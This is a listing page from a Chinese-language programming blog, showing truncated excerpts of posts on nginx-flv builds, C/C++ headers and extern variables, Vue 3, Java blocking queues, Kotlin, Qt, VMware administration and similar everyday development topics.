mkdir -p /opt/backup/docker-build/nginx-flv/nginx-src cd /opt/backup/docker-build/nginx-flv/nginx-src wget http://nginx.org/download/nginx-1.25.0.tar.gz tar -zxf nginx-1.25.0.tar.gz git clone https://github.com/winshining/nginx-http-flv-module.git #编译安装，完成后会安装在/usr/local/nginx-flv下
./configure --prefix=/user/local/nginx-flv --with-http_ssl_module --with-http_secure_link_module --add-module=nginx-http-flv-module-master make make install 三、nginx配置 #nginx主配置文件 vim /usr/local/nginx-flv/conf/nginx.conf
#user nobody; worker_processes auto; #error_log logs/error.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dabcbf7f94e5b98b3eb1e37f35c13e8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1db682d34a8c41a7c199de04012939bd/" rel="bookmark">
			引用另一文件的变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 两种方法引用变量 方法一：在一个外设文件里定义，另一个文件里引用方法二：在mian文件定义，在两个文件中引用还有几点要注意的： 在keil的多文件编程中，我们很多时候都需要从另一个文件中引用变量，使得多个外设协同工作。 那么该怎么引用呢？ 有两种方法！ 方法一：在一个外设文件里定义，另一个文件里引用 （1）先在test_1.c定义一个变量，
（2）然后在test_1.h声明，
（3）最后test_2.c文件中要使用时，要include test_1.h。
//在test_1.c文件中定义 int temp; //在text_1.h文件中声明 extern int temp; //在test_2.c文件中引用 #include test_1.c 方法二：在mian文件定义，在两个文件中引用 （1）在main.c中定义变量
（2）如果在test.c中使用，那么就在test.h中extern一下就好
//main.c文件中 int temp; //test.h文件中 extern int temp; 还有几点要注意的： 在a.c中才是变量temp真正定义的地方，而在a.h中只是一个声明，因此在声明时是不可赋值的，否则会报错在声明数组是可以省略数组的大小，例：
定义时： char name[10]; 声明时：
extern char name[]; 全局变量用 static 修饰时不可被其他文件引用，用 extern 也不可以；只能被用于本文件中的一个或多个函数中。
（全局变量就是定义在函数体外的变量） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9f17d9d8d9eda3e8fca452cf5c53701/" rel="bookmark">
			监听鼠标操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 手机端监听touchstart事件
let mouse = document.querySelector("#mouse") mouse.addEventListener("touchstart", function (e) { console.log("监听触摸事件", e.target) console.log(e.touches) //最多可以有10个触摸对象，每个对象可以获取其clientX\pageX\screenX let t0 = e.touches[0] console.log("在当前元素中坐标", t0.clientX, t0.clientY) console.log("在当前屏幕中坐标", t0.screenX, t0.screenY) console.log("在当前文档中坐标", t0.pageX, t0.pageY) }) 电脑端监听鼠标移动操作
let mouse = document.querySelector("#mouse") mouse.addEventListener("mousemove", function (e) { console.log("监听鼠标事件", e.target) console.log("在当前元素中坐标", e.clientX, e.clientY) console.log("在当前屏幕中坐标", e.screenX, e.screenY) console.log("在当前文档中坐标", e.pageX, e.pageY) let img = document.querySelector("#img") img.style.top = e.clientY - 10 + "px"; img.style.left = e.clientX - 10 + "px"; }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0e53cb7869a8c785e67954708e0a9f7/" rel="bookmark">
			Kaggle手势识别第一名代码解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kaggle Google - Isolated Sign Language Recognition竞赛链接Kaggle
第一名比赛方案链接Link
Train 笔记 下载轮子 !pip install -q /kaggle/input/tensorflow-2120/tensorflow-2.12.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl !pip install -q tensorflow-addons==0.20.0 !pip install -q git+https://github.com/hoyso48/tf-utils@main 加载要用到的库 import numpy as np import pandas as pd import tensorflow as tf import tensorflow_addons as tfa import matplotlib.pyplot as plt import matplotlib as mpl import tensorflow.keras.mixed_precision as mixed_precision from tqdm.autonotebook import tqdm import sklearn from tf_utils.schedules import OneCycleLR, ListedLR from tf_utils.callbacks import Snapshot, SWA from tf_utils.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0e53cb7869a8c785e67954708e0a9f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95fefab7665066ecadcc3e13223ef8c5/" rel="bookmark">
			Python3安装pyhanlp最佳解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Hanlp介绍 Hanlp是一款中文自然语言处理工具。Hanlp支持多种自然语言处理任务，包括分词、词性标注、命名实体识别、依存句法分析、情感分析、文本分类等。其主要优点包括：
高准确率：Hanlp采用了CRF模型分词，目前非深度学习方法中最佳的分词效果，対歧义词和未知词的识别效果更优，有效提高了分词的准确率和速度。广泛覆盖：Hanlp支持多种自然语言处理任务，包括分词、词性标注、命名实体识别、依存句法分析、情感分析、文本分类等，能够满足大部分的自然语言处理需求。多语种支持：Hanlp支持多种语言的处理，如中文、英文、日文等，可应用于多语言环境下的自然语言处理任务。易于集成：Hanlp提供了丰富的API接口和开箱即用的模型，易于集成到Java项目中，并且支持Python、Go、C++等多种编程语言的使用。 总之，Hanlp是一款功能强大、易于集成的中文自然语言处理工具，并且具有广泛的应用场景。
HanLP官网
2、问题背景 最近工作上需要用到hanlp这个包，因此开始踩坑之路……
ModuleNotFoundError: No module named 'hanlp'报错
pip install pyhanlp安装报错
3、解决方法 步骤1：安装JPype1，但是使用pip install JPype1命令安装报错。
解决方法：找对应Python版本的jypel的whl,下载链接：https://www.lfd.uci.edu/~gohlke/pythonlibs/
根据自己得python版本选择下载对应的安装包： pip install JPype1-1.2.0-cp36-cp36m-win_amd64.whl
注：安装时，whl后缀也需要带上。
检测是否安装成功（运行成功即可）：
import jpype jvmPath=jpype.getDefaultJVMPath() print(jvmPath) # D:\jdk\bin\server\jvm.dll 安装完成后，此时安装pip install pyhanlp，还是报错。
步骤2：源码编译安装
进入官网下载源代码zip ,然后解压到Python包中。链接地址：mirrors / hankcs / HanLP · GitCode
解压之后，在解压后的安装目录
D:\python3.6.6\Lib\site-packages\HanLP-doc-zh（这是安装目录）执行：
python setup.py install 开始执行编译安装。
安装过程会报错，需要安装torch，去Python安装包大全里面下载安装即可。
Python安装包大全：https://www.lfd.uci.edu/~gohlke/pythonlibs/
再执行：python setup.py install，还是有点小问题，但是运行代码不在报这个错了：ModuleNotFoundError: No module named 'hanlp'。
继续踩坑………………
步骤3：HanLP安装
下载jar配置文件hanlp.jar包和data数据，地址：Releases · hankcs/HanLP · GitHub
下图点击下载就可以了：
下载后先将hanlp-1.8.4-release安装包解压到本地，并重命名为hanlp_package（任意取），并将data-for-1.7.5.zip解压后的data文件夹放到hanlp_package安装包中。
接着，修改hanlp.properties配置文件，将里面的默认路径改为你本地路径即可：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95fefab7665066ecadcc3e13223ef8c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88e1229b768d411448e55e321a13ca8f/" rel="bookmark">
			关于window.devicePixelRatio
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		window.devicePixelRatio 是一个只读属性，返回设备的物理像素分辨率与CSS像素分辨率之比。
在计算机中，一个像素（pixel）是最小的显示单位，它由红、绿、蓝三个颜色组成。在显示器上，一个像素通常由一个荧光管或LED组成。根据显示器的大小和分辨率，每英寸的像素数被称为PPI（pixels per inch）。PPI越高，图像越清晰。
但是，为了满足不同设备的显示需求，开发人员使用CSS像素，这是一个抽象的单位，与设备的物理像素无关。CSS像素是指网页上的一个点，而这个点会被浏览器渲染成多个物理像素，以适应不同设备的分辨率。
window.devicePixelRatio 返回的是设备的物理像素分辨率与CSS像素分辨率之比。例如，如果一个设备的物理像素分辨率是640x480，CSS像素分辨率是320x240，那么 window.devicePixelRatio 的值就是 2。这意味着一个CSS像素由4个物理像素组成。
在移动设备中，window.devicePixelRatio 常用于响应式设计，以确定设备的屏幕尺寸和分辨率，从而为不同设备提供不同的CSS样式。通过检测 window.devicePixelRatio 的值，开发人员可以为高分辨率设备提供更高质量的图像和更清晰的字体。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e78b173fd2ffc97400ea1f02619f417/" rel="bookmark">
			CC&#43;&#43; 标头和源文件：它们如何工作？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文将向您展示将程序划分为C中的组件部分或正确使用标头和源文件C++诀窍。
介绍 我主要是为我的一个朋友写这篇文章的。但是，如果我不与大家分享这一点，我会对社区造成伤害，所以就在这里。
我们将探索标头和源文件以及它们的作用。这些代码的大部分在 C 和 C++ 中都有效，但C++特定的代码将被标识为这样。
我会保持简短，并涵盖要点。
了解这个烂摊子 标头和源文件之间的关系起初可能会令人困惑。在几年前自学C和C++时，我努力理解这些关系以及在哪里使用它们。
部分原因是没有完全理解原型设计的必要性，也没有理解C或C++中的链接过程。我们将在这里讨论这个问题。
原型 在使用结构、变量或函数之前，必须声明它。对于函数，您可以并且通常应该在函数实现本身之前为函数提供原型。原型本质上只是函数签名，即返回类型、名称、参数和任何修饰符，如 or （C++）。staticconst
请考虑以下事项：
C++
int sum(int lhs, int rhs);
这是名为 的函数的函数原型。请注意，我们没有在它之后放置它，也没有在其中进行任何实现。相反，它以分号结尾，向编译器指示这是一个原型而不是函数本身。sum{}
声明原型后，您可以使用该函数，即使它稍后出现在文件中，甚至在单独的 C 或 C++ 源文件中。
没有标头 当您用于包含头文件时，编译器（技术上是预处理器）实际上将包含的内容复制到包含它的文件中，即指令出现的行。这发生在实际编译任何源代码之前。这在以后发生。#include#include
因此，编译过程本身没有标头。它们都已转换为C++源文件，标头直接复制到源文件本身中。
如果我们把原型放在头文件（mymath.h）中，把实现放在源文件（main.c）中，这一切都有效：sum()
我的数学
C++
#ifndef MYMATH_H#define MYMATH_Hint sum(int lhs, int rhs);
#endif // MYMATH_H
你可能会问 // 的东西是怎么回事？由于 C 和 C++的工作方式，您很可能会经常多次包含标头，因为您将包含多个文件，而这些文件本身包含相同的文件。周围的内容确保编译器只处理第一个包含。#ifdef#define#endifsum()
在C++中，首选的替代方案是：
C++
#pragma onceint sum(int lhs, int rhs);
您应该始终在编写的任何标头中使用这些技术之一。
主.c
C++
#include &lt;stdio.h&gt;#include "mymath.h"int main(int argc, char** argv) {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e78b173fd2ffc97400ea1f02619f417/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f1200c21e3c79c3b8ce7220b0283e44/" rel="bookmark">
			Shell脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. shell概述 shell是一个命令行解释器, 它接受应用程序/用户命令 , 然后调用OS内核 1.Linux提供的shell解释器 2.bash 和 sh关系 3.centOS默认解析器是bash 二.shell脚本入门 脚本以 #!/bin/bash 开头 (指定解析器)
脚本常用执行方式
(1)采用 bash 或 sh+ 脚本相对路径/绝对路径 (不用赋予脚本+x权限)
(2)采用输入脚本的绝对路径/相对路径执行脚本 (必须有 x 权限)
(3)在脚本路径前加上 "." / source
解释: 前两种方式都是在当前shell中打开-个子shell来执行脚本内容，当脚本内容结束，则子shell关闭，回到父shell中。第三种，也就是使用在脚本路径前加“."”或者source 的方式，可以使脚本内容在当前shell里执行，而无需打开子shell! 这也是为什么我们每次要修改完/etc/profile文件以后，需要source一下的原因。开子shell与不开子shell 的区别就在于，环境变量的继承关系，如在子shell中设置的当前变量，父shell是不可见的。 (4)补充
① 第一种执行方法，本质是bash解析器帮你执行脚本，所以脚本本身不需要执行权限。第二种执行方法，本质是脚本需要自己执行，所以需要执行权限。这两种方法都新起一个子进程
无论是使用bash命令运行脚本，还是使用脚本文件的相对或绝对路径运行脚本，都会创建一个新的子shell来运行脚本。在使用bash命令运行脚本时，实际上是在当前shell中启动一个新的bash子进程，并将脚本作为该子进程的输入。该子进程会执行脚本中的命令，并在执行完成后退出在使用脚本文件的相对或绝对路径运行脚本时，则是通过操作系统的解释器来运行脚本。默无论使用哪种解释器，都会创建一个新的子shell来运行脚本，该子shell会执行脚本中的命令，并在执行完成后退出。需要注意的是，子shell与父shell是独立的，它们有自己的环境变量、工作目录等属性。因此，在子shell中定义的变量和修改的环境，不会影响到父shell的环境 ② . 和 source 三.变量 1.系统预定义变量 2.自定义变量 (1)基本语法
定义变量: 变量名=变量值 ,(注意,=号前后不能有空格)
撤销变量: unset 变量名声明静态变量: readonly 变量, 注意 : 不能 unset (2)变量定义规则
①变量名称可以由字母,数字,下划线组成,当时不能以数字开头 , 环境变量名建议大写②等号两侧不能有空格③在bash中，变量默认类型都是字符串类型，无法直接进行数值运算。④变量的值如果有空格，需要使用双引号或单引号括起来。 (3)使用案例
①全局环境变量
②环境变量使用
③变量的值有空格需要用双引号 / 单引号括起来
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f1200c21e3c79c3b8ce7220b0283e44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d0a01c918e9e5357006cf139e97e337/" rel="bookmark">
			VMware vCenter Server Appliance部署步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在Windows机器上，进入VCSA软件的图形界面安装目录，如VMware-VCSA-all-6.7.0-10244745\vcsa-ui-installer\win32，运行installer.exe安装程序。
2.根据需要，确认是否安装独立的PSC或嵌入式的PSC。
在安装好PSC后，点击“CONTINUE”或通过https://PSC-IP:5480进入PSC的配置界面，进行第二阶段的配置。
3.安装VCSA也分两个阶段。
1）第一个阶段，安装vCenter Server软件。
2）第二个阶段，进行vCenter Server Appliance的配置。
建议启用SSH访问，方便后期的维护。
如果前面安装阶段设置的DNS地址不能解析PSC的主机名，那么这时需要通过控制台或ssh登录vCenter Server Appliance的系统，在/etc/hosts文件中添加外部PSC主机名的解析（即使主机名设置为IP地址，也需要解析为IP地址，即两列都是PSC的IP地址），否则会无法连上外部PSC，报“Failed to validate sso.([Error 10003] Invalid Credentials)“的错误。
配置完成后，即可通过浏览器访问vCenter Server的IP，进行vCenter的操作。
注：为了保证数据的安全（PostgreSQL数据库的正常关闭），建议分别通过PSC-IP:5480和vCenterServer-IP:5480进行PSC和vCenterServer虚拟机的关闭或重启操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f5eb46c0258fa94a99888b793a69156/" rel="bookmark">
			uniapp打包集成到app内提示当前应用运行在自定义调试基座中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天遇到个问题，将uniapp打包wgt，集成到app内，在运行项目后页面显示当前应用运行在自定义调试基座中一个提示框，如下图：
解决办法就是在原生代码中找到dcloud_control.xml文件，将syncDebug改成false
这样就完美解决了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/565193eddc05e08de7a2f7c72ac9d3ea/" rel="bookmark">
			JAVA-创建PDF文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前期准备
1、中文字体文件
2、maven依赖
二、创建PDF文档方法
三、通过可填充PDF模板将业务参数进行填充
1、 设置可填充的PDF表单
2、代码开干，代码填充可编辑PDF并另存文件
一、前期准备 1、中文字体文件 本演示使用的是iText 7版本，如果没有中文字体，那生成的PDF文档涉及中文的区域都无法显示。
现有查找到的PDF免费下载网址如下：
阿里巴巴矢量图标库：除了图标库，该网站还提供了一些免费的字体库供下载和使用。字由：字由是一个专注于中文字体的网站，提供了一些优质的免费字体供下载。字体中国：字体中国是一个提供中文字体下载的网站，包含了许多中文设计师的作品。站长之家字体库：站长之家提供了大量的免费字体库，包含了各种中文字体和英文字体。 2、maven依赖 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.itextpdf&lt;/groupId&gt; &lt;artifactId&gt;itext7-core&lt;/artifactId&gt; &lt;version&gt;7.2.5&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.itextpdf&lt;/groupId&gt; &lt;artifactId&gt;kernel&lt;/artifactId&gt; &lt;version&gt;7.2.5&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 二、创建PDF文档方法 import com.itextpdf.io.image.ImageDataFactory; import com.itextpdf.kernel.events.Event; import com.itextpdf.kernel.events.IEventHandler; import com.itextpdf.kernel.events.PdfDocumentEvent; import com.itextpdf.kernel.font.PdfFont; import com.itextpdf.kernel.font.PdfFontFactory; import com.itextpdf.kernel.geom.Rectangle; import com.itextpdf.kernel.pdf.PdfDocument; import com.itextpdf.kernel.pdf.PdfPage; import com.itextpdf.kernel.pdf.PdfWriter; import com.itextpdf.kernel.pdf.canvas.PdfCanvas; import com.itextpdf.layout.Canvas; import com.itextpdf.layout.Document; import com.itextpdf.layout.element.Cell; import com.itextpdf.layout.element.Image; import com.itextpdf.layout.element.Paragraph; import com.itextpdf.layout.element.Table; import com.itextpdf.layout.properties.HorizontalAlignment; import com.itextpdf.layout.properties.TextAlignment; import com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/565193eddc05e08de7a2f7c72ac9d3ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40e6b50acb4c0b2d5700824754a1b640/" rel="bookmark">
			IoT Studio 物联网可视化应用搭建开发实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.使用IoT Studio快速构建可视化应用 在物联网业务场景中设备数据可视化应用是最普遍的需求，阿里云物联网应用开发（IoT Studio）提供了Web可视化开发、移动可视化开发、业务逻辑开发与物联网数据分析等一系列便捷的物联网开发工具，解决物联网开发领域开发链路长、定制化程度高、投入产出比低、技术栈复杂、协同成本高、方案移植困难等问题。
本次物联网应用开发实践我们用六合一传感器（温度、湿度、二氧化碳、PM2.5、PM10、甲醛）实现家庭环境数据实时采集，通过家中Wi-Fi上报到阿里云IoT物联网平台，借助IoT Studio低代码工具搭建可视化大屏，实时监控家中环境指标变化。
完整链路参考如下：
完整内容请点击下方链接查看： IoT Studio 物联网可视化应用搭建开发实践-阿里云开发者社区
版权声明：本文内容由阿里云实名注册用户自发贡献，版权归原作者所有，阿里云开发者社区不拥有其著作权，亦不承担相应法律责任。具体规则请查看《 阿里云开发者社区用户服务协议》和《 阿里云开发者社区知识产权保护指引》。如果您发现本社区中有涉嫌抄袭的内容，填写 侵权投诉表单进行举报，一经查实，本社区将立刻删除涉嫌侵权内容。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/158f970f06b8b982f60f4a8ad1bbd51c/" rel="bookmark">
			使用Vue 3和Vite构建基础案例整合饿了么UI、路由、组件和常用插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言：
Vue 3和Vite是当前前端开发中非常热门的技术组合，它们提供了快速、高效的开发环境和强大的生态系统。本篇博客将介绍如何使用Vue 3和Vite构建一个基础案例，并整合饿了么UI、路由、组件和常用插件，让您快速上手并搭建一个功能强大的Web应用。
步骤1：创建项目 首先，我们需要安装Vite工具来创建一个基于Vue 3的项目。打开命令行界面，执行以下命令：
npm init vite@latest my-app -- --template vue 该命令将使用Vite提供的Vue模板创建一个新的项目，并将其命名为my-app。然后进入项目目录：
cd my-app 使用以下命令安装项目依赖并启动开发服务器：
npm install npm run dev 现在，我们已经成功创建了一个基于Vue 3和Vite的项目，并启动了开发服务器。
步骤2：安装饿了么UI组件库 饿了么UI是一个强大且易于使用的Vue组件库，它提供了丰富的UI组件和交互效果。我们可以使用以下命令来安装饿了么UI：
npm install element-plus --save 安装完成后，在主入口文件（通常是main.js）中引入饿了么UI的样式和组件：
import { createApp } from 'vue'; import ElementPlus from 'element-plus'; import 'element-plus/lib/theme-chalk/index.css'; import App from './App.vue'; createApp(App).use(ElementPlus).mount('#app'); 现在，我们可以在项目中使用饿了么UI提供的各种组件和样式。
步骤3：配置路由 在Vue项目中使用路由是非常常见的需求。Vue Router是Vue官方提供的路由管理库，它可以帮助我们实现SPA（单页应用）的路由功能。我们可以使用以下命令来安装Vue Router：
npm install vue-router@next --save 在项目根目录下创建一个新的文件夹src/router，然后在该文件夹下创建一个新的文件index.js，用于配置路由：
import { createRouter, createWebHistory } from 'vue-router'; import Home from '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/158f970f06b8b982f60f4a8ad1bbd51c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81b6f287ea045bc057a1bb06c30ec3af/" rel="bookmark">
			VMware集群不可访问 证书到期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错：
HTTP状态 500 - 内部服务器错误 原因：service-control --start vmware-vpxd 启动不了
查看内部原因是证书到期
root@localhost [ ~ ]# service-control --start vmware-vpxd
peration not cancellable. Please wait for it to finish...
Performing start operation on service vpxd...
Error executing start on service vpxd. Details {
"resolution": null,
"detail": [
{
"translatable": "An error occurred while starting service '%(0)s'",
"localized": "An error occurred while starting service 'vpxd'",
"args": [
"vpxd"
],
"id": "install.ciscommon.service.failstart"
}
],
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81b6f287ea045bc057a1bb06c30ec3af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5570b42e90ae12b91036b5a43e171675/" rel="bookmark">
			Java中的阻塞队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是阻塞队列
阻塞队列（BlockingQueue）是一个支持两个附加操作的队列。这两个附加的操作支持阻塞的插入和移除方法。
附加操作解释支持阻塞的插入方法意思是当队列满时，队列会阻塞插入元素的线程，直到队列不满。支持阻塞的移除方法意思是在队列为空时，获取元素的线程会等待队列变为非空。 插入和移除操作的4中处理方式
在阻塞队列不可用时，这两个附加操作提供了4种处理方式
操作Special valueThrows exception一致阻塞超时退出Insertoffer(e)add(e)put(e)offer(e,time,unit)Removepoll()remove()take()poll(time,unit)Examinepeek()element()不可以不可以返回特殊值：当往队列插入元素时，会返回元素是否插入成功，成功返回true。如果是移除方法，则是从队列里取出一个元素，如果没有则返回null。抛出异常：当队列满时，如果再往队列里插入元素，会抛出IllegalStateException（“Queue full”）异常。当队列空时，从队列里获取元素会抛出NoSuchElementException异常。一直阻塞：当阻塞队列满时，如果生产者线程往队列里put元素，队列会一直阻塞生产者线程，直到队列可用或者响应中断退出。当队列空时，如果消费者线程从队列里take元素，队列会阻塞住消费者线程，直到队列不为空。超时退出：当阻塞队列满时，如果生产者线程往队列里插入元素，队列会阻塞生产者线程一段时间，如果超过了指定的时间，生产者线程就会退出。 JDK 7提供了7个阻塞队列
阻塞队列解释补充ArrayBlockingQueue一个由数组结构组成的有界阻塞队列FIFO
创建一个公平的阻塞队列
ArrayBlockingQueue fairQueue = new ArrayBlockingQueue(1000,true);
创建一个非公平的阻塞队列
ArrayBlockingQueue fairQueue = new ArrayBlockingQueue(1000);
LinkedBlockingQueue一个由链表结构组成的有界阻塞队列FIFO
此队列的 默认 和 最大长度 为Integer.MAX_VALUEPriorityBlockingQueue一个支持优先级排序的无界阻塞队列默认情况下元素采取自然顺序升序排列。也可以自定义。
需要注意的是不能保证同优先级元素的顺序。DelayQueue一个使用优先级队列实现的无界阻塞队列
一个支持延时获取元素的无界阻塞队列。在创建元素时可以指定多久才能从队列中获取当前元素。只有在 延迟 期满时才能从队列中提取元素。
DelayQueue非常有用，可以将DelayQueue运用在以下应用场景。
·缓存系统的设计：可以用DelayQueue保存缓存元素的有效期，使用一个线程循环查询DelayQueue，一旦能从DelayQueue中获取元素时，表示缓存有效期到了。
·定时任务调度：使用DelayQueue保存当天将会执行的任务和执行时间，一旦从DelayQueue中获取到任务就开始执行，比如TimerQueue就是使用DelayQueue实现的。SynchronousQueue一个不存储元素的阻塞队列每一个put操作必须等待一个take操作，否则不能继续添加元素。
默认情况下线程采用非公平性策略访问队列。
SynchronousQueue unfair = new SynchronousQueue();
使用构造方法SynchronousQueue(true)创建公平性访问的SynchronousQueue，则等待的线程会采用先进先出的顺序访问队列。
SynchronousQueue fair = new SynchronousQueue(true);
SynchronousQueue可以看成是一个传球手，负责把生产者线程处理的数据直接传递给消费者线程。队列本身并不存储任何元素，非常适合传递性场景。LinkedTransferQueue一个由链表结构组成的无界阻塞队列（1）transfer方法
如果当前有消费者正在等待接收元素（消费者使用take()方法或带时间限制的poll()方法时），transfer方法可以把生产者传入的元素立刻transfer（传输）给消费者。如果没有消费者在等待接收元素，transfer方法会将元素存放在队列的tail节点，并等到该元素被消费者消费了才返回。
（2）tryTransfer方法
tryTransfer方法是用来试探生产者传入的元素是否能直接传给消费者。如果没有消费者等待接收元素，则返回false。和transfer方法的区别是tryTransfer方法无论消费者是否接收，方法立即返回，而transfer方法是必须等到消费者消费了才返回。
对于带有时间限制的tryTransfer（E e，long timeout，TimeUnit unit）方法，试图把生产者传入的元素直接传给消费者，但是如果没有消费者消费该元素则等待指定的时间再返回，如果超时还没消费元素，则返回false，如果在超时时间内消费了元素，则返回true。LinkedBlockingDeque一个由链表结构组成的双向阻塞队列双向队列因为多了一个操作队列的入口，在多线程同时入队时，也就减少了一半的竞争。
相比其他的阻塞队列，LinkedBlockingDeque多了addFirst、addLast、offerFirst、offerLast、peekFirst和peekLast等方法 什么是线程公平的访问队列？
所谓公平访问队列是指阻塞的线程，可以按照阻塞的先后顺序访问队列，即先阻塞线程先访问队列。
-----------------------------------------------------------------------------摘自 书名：Java并发编程的艺术 作者：方腾飞；魏鹏；程晓明
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b6d75d2df11aa3d1955666df717e609/" rel="bookmark">
			【Android学习】kotlin编程快速入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、条件语句&amp;循环语句
2、类的继承、构造、接口
3、数据类&amp;单例类
4、lamada编程
5、空指针检查
6、字符串内嵌表达式、函数参数默认值
1、条件语句&amp;循环语句 package com.example.Chapter2 //if条件语句 //if(条件){满足条件执行的语句} fun IfLearn(param1:Int,param2:Int):Int{ if(param1 &lt; param2){ return param1 } else{ return param2 } } //when条件语句 //when(变量){匹配值1-&gt;{执行逻辑1} 匹配值2-&gt;{执行逻辑2}} fun whenLeran(num:Int){ var n:String = "" when(num){ 8 -&gt; {n="big"} 7 -&gt; {n="big"} 1 -&gt; {n="small"} 2 -&gt; {n="small"} else -&gt; {n="NA"} } println(n) } //for循环语句 fun forLearn(num1:Int,num2:Int){ //升序闭区间序列 println("for i in num1..num2 构造左闭右闭区间") for (i in num1..num2) { println(i) } //升序左闭右开区间序列 println("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b6d75d2df11aa3d1955666df717e609/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70f85e7e72ab0c65eb6c89e4e4d4af85/" rel="bookmark">
			Qt中QString转string中文乱码问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Qt中QString转string中文乱码问题_shaomingshan_的博客-CSDN博客
QString与string相互转换可以用如下方法：
QString::toStdString(); QString::fromStdString(); 数字和QString互相转换：
QString::number(); //数字转QString，括号里填数字 toInt(); //QString转数字 qstring.toInt(); 然而QString直接与string相互转换会出现中文乱码问题，为此Qt4中提供了三条语句
QTextCodec::setCodecForTr(QTextCodec::codecForName("UTF-8")); QTextCodec::setCodecForCStrings(QTextCodec::codecForName("UTF-8")); //↑这两个函数在QT5中已被去掉 QTextCodec::setCodecForLocale(QTextCodec::codecForName("UTF-8")); 但是由于很多程序员完全不考虑这三行代码是否有任何副作用，只要出现乱码就不分青红皂白的使用这三行代码，造成滥用，所以在Qt5中去掉了前两个函数
那么应该如何解决中文乱码的问题呢，答案当然是有的，在程序中定义如下两个方法即可
QString str2qstr(const string str) { return QString::fromLocal8Bit(str.data()); } string qstr2str(const QString qstr) { QByteArray cdata = qstr.toLocal8Bit(); return string(cdata); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b535f2ba777bc6b34d5af6e4e666cfc3/" rel="bookmark">
			Go学习圣经：队列削峰&#43;批量写入 超高并发原理和实操
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说在前面： 本文是《Go学习圣经》 的第二部分。
第一部分请参见：Go学习圣经：0基础精通GO开发与高并发架构（1）
现在拿到offer超级难，甚至连面试电话，一个都搞不到。
尼恩的技术社群中（50+），很多小伙伴凭借 “左手云原生+右手大数据”的绝活，拿到了offer，并且是非常优质的offer，据说年终奖都足足18个月。
从Java高薪岗位和就业岗位来看，云原生、K8S、GO 现在对于 高级工程师/架构师来说，越来越重要。尼恩从架构师视角出发，基于自己的尼恩 3高架构师知识体系和知识宇宙，写一本《GO学习圣经》
最终的学习目标 咱们的目标，不仅仅在于 GO 应用编程自由，更在于 GO 架构自由。
